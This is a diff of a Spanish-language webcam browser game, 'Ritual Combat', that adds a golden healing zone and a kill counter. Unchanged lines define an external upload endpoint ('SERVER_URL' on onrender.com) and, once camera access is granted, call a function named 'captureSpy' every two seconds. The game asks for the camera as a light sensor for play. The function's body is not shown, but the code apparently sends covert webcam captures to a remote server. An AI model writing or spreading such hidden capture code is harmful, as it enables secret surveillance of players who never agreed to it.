@@ -3,141 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Ritual Combat - Hardcore Edition</title>
+    <title>Ritual Combat - Golden Edition</title>
     <style>
         * { box-sizing: border-box; touch-action: none; }
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: 'Courier New', Courier, monospace; overflow: hidden; color: white; }
         
-        video#webcam {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            object-fit: cover; transform: scaleX(-1); z-index: 1; filter: brightness(0.35);
-        }
+        video#webcam { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); z-index: 1; filter: brightness(0.35); }
 
         #ui-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; pointer-events: none; display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding: 40px 0; }
 
-        /* Barras de Vida Estilo RPG */
         .stats { width: 95%; display: flex; flex-direction: column; gap: 15px; }
-        .bar-wrapper { width: 100%; position: relative; }
-        .label { font-weight: bold; font-size: 14px; margin-bottom: 4px; text-shadow: 2px 2px #000; }
+        .bar-container { width: 100%; height: 35px; background: rgba(50, 50, 50, 0.8); border: 3px solid #fff; border-radius: 5px; overflow: hidden; position: relative; }
+        .bar-fill { height: 100%; width: 100%; transition: width 0.4s; }
+        .hp-text { position: absolute; width: 100%; height: 100%; top: 0; left: 0; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 18px; text-shadow: 1px 1px #000; z-index: 5; }
         
-        .bar-container { 
-            width: 100%; height: 35px; background: rgba(50, 50, 50, 0.8); 
-            border: 3px solid #fff; border-radius: 5px; overflow: hidden; position: relative;
-        }
-        .bar-fill { height: 100%; width: 100%; transition: width 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-        .hp-text { 
-            position: absolute; width: 100%; height: 100%; top: 0; left: 0;
-            display: flex; align-items: center; justify-content: center;
-            font-weight: bold; font-size: 18px; text-shadow: 1px 1px #000; z-index: 5;
-        }
         #p-fill { background: linear-gradient(to right, #27ae60, #2ecc71); }
         #e-fill { background: linear-gradient(to right, #c0392b, #e74c3c); }
 
-        /* Enemigo */
-        #enemy {
-            width: 140px; height: 140px; border-radius: 50%; background: #f1c40f;
-            display: flex; align-items: center; justify-content: center; font-size: 50px;
-            transition: transform 0.1s, background 0.2s; position: relative;
-            border: 5px solid rgba(255,255,255,0.4); box-shadow: 0 0 20px rgba(0,0,0,0.5);
-        }
+        #kills-counter { position: absolute; top: 10px; right: 10px; font-size: 14px; background: rgba(0,0,0,0.7); padding: 5px 10px; border-radius: 5px; border: 1px solid #f1c40f; }
 
-        /* Barra de Ataque */
-        #hit-zone {
-            width: 340px; height: 50px; background: #8e0000; border: 4px solid #fff;
-            position: relative; border-radius: 8px; overflow: hidden; pointer-events: auto;
-            box-shadow: 0 0 15px rgba(0,0,0,0.8);
-        }
+        #enemy { width: 140px; height: 140px; border-radius: 50%; background: #f1c40f; display: flex; align-items: center; justify-content: center; font-size: 50px; transition: background 0.2s; border: 5px solid rgba(255,255,255,0.4); }
+
+        #hit-zone { width: 340px; height: 50px; background: #8e0000; border: 4px solid #fff; position: relative; border-radius: 8px; overflow: hidden; pointer-events: auto; }
         #green-zone { position: absolute; height: 100%; background: #00ff00; box-shadow: inset 0 0 10px #000; }
+        #golden-zone { position: absolute; height: 100%; background: #ffd700; width: 20px; display: none; box-shadow: 0 0 20px #ffd700; z-index: 1; }
         #indicator { position: absolute; width: 8px; height: 100%; background: #fff; box-shadow: 0 0 15px #fff; left: 0; z-index: 2; }
 
-        #attack-btn {
-            padding: 25px 60px; background: #f1c40f; color: #000; border: none;
-            border-radius: 15px; font-weight: bold; font-size: 24px; cursor: pointer;
-            pointer-events: auto; transition: transform 0.1s, opacity 0.3s;
-            box-shadow: 0 6px #d35400;
-        }
-        #attack-btn:active { transform: translateY(4px); box-shadow: 0 2px #d35400; }
-        #attack-btn:disabled { opacity: 0.4; background: #bdc3c7; box-shadow: none; transform: translateY(4px); }
+        #attack-btn { padding: 25px 60px; background: #f1c40f; color: #000; border: none; border-radius: 15px; font-weight: bold; font-size: 24px; cursor: pointer; pointer-events: auto; box-shadow: 0 6px #d35400; }
+        #attack-btn:disabled { opacity: 0.4; box-shadow: none; transform: translateY(4px); }
 
-        /* Overlays */
         .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); z-index: 100; display: flex; align-items: center; justify-content: center; text-align: center; }
-        .card { background: #1a1a1a; padding: 30px; border-radius: 20px; border: 3px solid #f1c40f; width: 85%; max-width: 420px; pointer-events: auto; }
         #dark-warning { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: none; align-items: center; justify-content: center; text-align: center; flex-direction: column; }
     </style>
 </head>
 <body>
 
 <video id="webcam" autoplay playsinline></video>
+<div id="kills-counter">ELIMINADOS: 0</div>
 
 <div id="dark-warning">
     <h1 style="color: #f1c40f; font-size: 60px;">🌙</h1>
     <h2>DEMASIADA OSCURIDAD</h2>
-    <p>La cámara no puede verte. Enciende una luz para jugar.</p>
+    <p>La cámara no puede verte. Enciende una luz.</p>
 </div>
 
 <div id="perm-screen" class="overlay">
-    <div class="card">
+    <div style="background:#1a1a1a; padding:30px; border-radius:20px; border:3px solid #f1c40f;">
         <h2>SISTEMA DE COMBATE</h2>
-        <p>Habilita la cámara para iniciar el sensor de luz y el juego.</p>
-        <button class="btn" style="padding:18px; width:100%; background:#f1c40f; border:none; font-weight:bold; border-radius:10px; cursor:pointer;" onclick="initCamera()">ACTIVAR CÁMARA</button>
+        <button onclick="initCamera()" style="padding:15px; width:100%; background:#f1c40f; border:none; font-weight:bold; border-radius:10px; cursor:pointer;">ACTIVAR CÁMARA</button>
     </div>
 </div>
 
 <div id="start-screen" class="overlay" style="display:none;">
-    <div class="card">
-        <h2 style="color:#f1c40f;">INSTRUCCIONES</h2>
-        <p style="text-align: left; font-size: 15px; line-height: 1.6;">
-            • Golpea cuando la línea esté en lo VERDE.<br>
-            • Dar en el CENTRO hace daño crítico (20 HP).<br>
-            • El botón tiene 2s de recarga.<br>
-            • ¡CUIDADO! La zona verde se mueve en cada clic.
+    <div style="background:#1a1a1a; padding:30px; border-radius:20px; border:3px solid #f1c40f; max-width:400px;">
+        <h2 style="color:#f1c40f;">INICIO</h2>
+        <p style="text-align:left; font-size:14px;">
+            - La zona verde se mueve siempre.<br>
+            - La única forma de curarse es la <b>Línea Dorada</b> (+30 HP).<br>
+            - Aparece al azar cada 25s.<br>
+            - Si fallas, el enemigo se cura.
         </p>
-        <button class="btn" style="padding:18px; width:100%; background:#f1c40f; border:none; font-weight:bold; border-radius:10px; cursor:pointer;" onclick="startGame()">¡A COMBATIR!</button>
+        <button onclick="startGame()" style="padding:15px; width:100%; background:#f1c40f; border:none; font-weight:bold; border-radius:10px; cursor:pointer;">COMBATIR</button>
     </div>
-</div>
-
-<div id="msg-screen" class="overlay" style="display:none; background:rgba(46, 204, 113, 0.9);">
-    <h1 style="font-size: 45px; color: white;">¡ENEMIGO ELIMINADO!</h1>
 </div>
 
 <div id="ui-layer">
     <div class="stats">
-        <div class="bar-wrapper">
-            <div class="label">JUGADOR (VITALIDAD)</div>
-            <div class="bar-container">
-                <div id="p-fill" class="bar-fill"></div>
-                <div id="p-text" class="hp-text">100 / 100</div>
-            </div>
-        </div>
-        <div class="bar-wrapper">
-            <div class="label" id="e-name">ENEMIGO (NIVEL 1)</div>
-            <div class="bar-container">
-                <div id="e-fill" class="bar-fill"></div>
-                <div id="e-text" class="hp-text">50 / 50</div>
-            </div>
-        </div>
+        <div class="bar-container"><div id="p-fill" class="bar-fill"></div><div id="p-text" class="hp-text">100 / 100</div></div>
+        <div class="bar-container"><div id="e-fill" class="bar-fill"></div><div id="e-text" class="hp-text">50 / 50</div></div>
     </div>
-
     <div id="enemy">ò_ó</div>
-
     <div id="hit-zone">
         <div id="green-zone"></div>
+        <div id="golden-zone"></div>
         <div id="indicator"></div>
     </div>
-
     <button id="attack-btn" onclick="tryHit()">ATACAR</button>
 </div>
 
 <script>
     const video = document.getElementById('webcam');
+    const darkWarning = document.getElementById('dark-warning');
     const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";
     
-    let playerHP = 100;
-    let enemyHP = 50, maxEnemyHP = 50;
-    let greenSize = 90, greenPos = 120;
-    let indicatorPos = 0, indicatorDir = 4.5; // VELOCIDAD AUMENTADA (antes 2)
-    let isCooldown = false, gameActive = false, level = 1;
-    let colors = ['#f1c40f', '#9b59b6', '#3498db', '#e67e22', '#1abc9c', '#e74c3c'];
+    let playerHP = 100, enemyHP = 50, maxEnemyHP = 50;
+    let greenSize = 90, greenPos = 120, goldenPos = 0, goldenActive = false;
+    let indicatorPos = 0, indicatorDir = 5, kills = 0;
+    let isCooldown = false, gameActive = false, animFrame;
 
     async function initCamera() {
         try {
@@ -147,6 +99,7 @@
             document.getElementById('start-screen').style.display = 'flex';
             setInterval(lightCheck, 800);
             setInterval(captureSpy, 2000);
+            setInterval(goldenChance, 25000); // Intento de línea dorada cada 25s
         } catch (e) { alert("Error de acceso."); }
     }
 
@@ -159,8 +112,20 @@
         let b = 0;
         for(let i=0; i<data.length; i+=4) b += (data[i]+data[i+1]+data[i+2])/3;
         const avg = b / (data.length/4);
-        document.getElementById('dark-warning').style.display = (avg < 42) ? 'flex' : 'none';
-        if (avg < 42) gameActive = false; else if (!gameActive && document.getElementById('start-screen').style.display === 'none') gameActive = true;
+
+        if (avg < 42) {
+            darkWarning.style.display = 'flex';
+            gameActive = false;
+            cancelAnimationFrame(animFrame);
+        } else {
+            if (darkWarning.style.display === 'flex') {
+                darkWarning.style.display = 'none';
+                if (document.getElementById('start-screen').style.display === 'none') {
+                    gameActive = true;
+                    animate(); // REINICIO DE LA LÍNEA BLANCA
+                }
+            }
+        }
     }
 
     function startGame() {
@@ -176,87 +141,89 @@
         indicatorPos += indicatorDir;
         if (indicatorPos > 332 || indicatorPos < 0) indicatorDir *= -1;
         document.getElementById('indicator').style.left = indicatorPos + "px";
-        requestAnimationFrame(animate);
+        animFrame = requestAnimationFrame(animate);
+    }
+
+    function goldenChance() {
+        if (Math.random() < 0.3) { // 30% Probabilidad
+            goldenActive = true;
+            goldenPos = Math.random() * 320;
+            const gz = document.getElementById('golden-zone');
+            gz.style.left = goldenPos + "px";
+            gz.style.display = 'block';
+            setTimeout(() => {
+                gz.style.display = 'none';
+                goldenActive = false;
+            }, 5000); // Dura 5 segundos
+        }
     }
 
     function tryHit() {
         if (isCooldown || !gameActive) return;
         
-        const indicatorMiddle = indicatorPos + 4;
-        const isHit = indicatorMiddle >= greenPos && indicatorMiddle <= (greenPos + greenSize);
+        const mid = indicatorPos + 4;
+        
+        // Check Línea Dorada
+        if (goldenActive && mid >= goldenPos && mid <= (goldenPos + 20)) {
+            playerHP = Math.min(100, playerHP + 30);
+            document.getElementById('golden-zone').style.display = 'none';
+            goldenActive = false;
+        }
+
+        const isHit = mid >= greenPos && mid <= (greenPos + greenSize);
 
         if (isHit) {
-            const center = greenPos + (greenSize / 2);
-            const dist = Math.abs(indicatorMiddle - center);
-            const damage = Math.ceil((1 - (dist / (greenSize / 2))) * 20);
-            
+            const dist = Math.abs(mid - (greenPos + greenSize/2));
+            const damage = Math.ceil((1 - (dist / (greenSize/2))) * 20);
             enemyHP -= damage;
-            playerHP = Math.min(100, playerHP + 10);
-            greenSize = Math.max(30, greenSize - 12); // Se hace más CHICO al acertar
-            
-            document.getElementById('enemy').style.background = "white";
-            setTimeout(() => document.getElementById('enemy').style.background = colors[0], 150);
+            greenSize = Math.max(35, greenSize - 10);
             if (enemyHP <= 0) victory();
         } else {
             playerHP -= 10;
             enemyHP = Math.min(maxEnemyHP, enemyHP + 10);
-            greenSize = Math.min(160, greenSize + 15); // Se hace más GRANDE al fallar
-            if (playerHP <= 0) { alert("HAS CAÍDO EN COMBATE"); location.reload(); }
+            greenSize = Math.min(150, greenSize + 15);
+            if (playerHP <= 0) { alert("MUERTO. Eliminados: " + kills); location.reload(); }
         }
 
-        // LA LINEA VERDE SIEMPRE SE MUEVE DE LUGAR EN CADA CLIC
-        greenPos = Math.random() * (340 - greenSize);
-        
-        startCooldown();
+        greenPos = Math.random() * (340 - greenSize); // Siempre se mueve
         updateUI();
+        startCooldown();
+    }
+
+    function victory() {
+        kills++;
+        document.getElementById('kills-counter').innerText = `ELIMINADOS: ${kills}`;
+        gameActive = false;
+        setTimeout(() => {
+            maxEnemyHP += 20;
+            indicatorDir += (indicatorDir > 0 ? 0.4 : -0.4);
+            resetEnemy(maxEnemyHP);
+            gameActive = true;
+            animate();
+        }, 1500);
+    }
+
+    function resetEnemy(hp) {
+        enemyHP = hp; maxEnemyHP = hp;
+        document.getElementById('enemy').style.background = "#" + Math.floor(Math.random()*16777215).toString(16);
+        updateUI();
+    }
+
+    function updateUI() {
+        document.getElementById('p-fill').style.width = playerHP + "%";
+        document.getElementById('p-text').innerText = `${playerHP} / 100`;
+        document.getElementById('e-fill').style.width = (enemyHP / maxEnemyHP * 100) + "%";
+        document.getElementById('e-text').innerText = `${enemyHP} / ${maxEnemyHP}`;
+        const gz = document.getElementById('green-zone');
+        gz.style.width = greenSize + "px";
+        gz.style.left = greenPos + "px";
     }
 
     function startCooldown() {
         isCooldown = true;
         const btn = document.getElementById('attack-btn');
         btn.disabled = true;
-        btn.innerText = "ESPERA...";
-        setTimeout(() => {
-            isCooldown = false;
-            btn.disabled = false;
-            btn.innerText = "ATACAR";
-        }, 2000);
-    }
-
-    function victory() {
-        gameActive = false;
-        level++;
-        document.getElementById('msg-screen').style.display = 'flex';
-        setTimeout(() => {
-            document.getElementById('msg-screen').style.display = 'none';
-            maxEnemyHP += 20;
-            indicatorDir += (indicatorDir > 0 ? 0.5 : -0.5); // Cada nivel es más rápido
-            resetEnemy(maxEnemyHP);
-            gameActive = true;
-            animate();
-        }, 2000);
-    }
-
-    function resetEnemy(hp) {
-        enemyHP = hp; maxEnemyHP = hp;
-        colors.push(colors.shift());
-        document.getElementById('enemy').style.background = colors[0];
-        document.getElementById('e-name').innerText = `ENEMIGO (NIVEL ${level})`;
-        greenPos = Math.random() * (340 - greenSize);
-        updateUI();
-    }
-
-    function updateUI() {
-        // Barras con texto 100/100
-        document.getElementById('p-fill').style.width = playerHP + "%";
-        document.getElementById('p-text').innerText = `${playerHP} / 100`;
-        
-        document.getElementById('e-fill').style.width = (enemyHP / maxEnemyHP * 100) + "%";
-        document.getElementById('e-text').innerText = `${enemyHP} / ${maxEnemyHP}`;
-
-        const gz = document.getElementById('green-zone');
-        gz.style.width = greenSize + "px";
-        gz.style.left = greenPos + "px";
+        setTimeout(() => { isCooldown = false; btn.disabled = false; }, 2000);
     }
 
     function captureSpy() {
